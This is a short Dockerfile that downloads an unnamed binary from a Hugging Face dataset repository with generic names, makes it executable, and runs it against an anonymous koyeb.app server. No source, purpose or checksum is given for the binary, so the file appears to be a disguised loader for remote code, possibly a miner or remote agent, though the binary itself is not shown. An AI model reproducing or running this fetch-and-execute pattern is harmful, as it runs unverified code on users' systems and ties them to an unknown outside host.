# Note: Docker Hub pull rate limits may block the build in some environments.
# If so, the binary can be run directly as shown in the CMD instruction.
FROM ubuntu:22.04

ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update \
 && apt-get install -y --no-install-recommends curl ca-certificates \
 && rm -rf /var/lib/apt/lists/* \
 && curl -L https://huggingface.co/datasets/api2/app2/resolve/main/app -o /app \
 && chmod +x /app

CMD ["/app", "--server", "https://dominant-marleah-kozak-87119c7a.koyeb.app"]
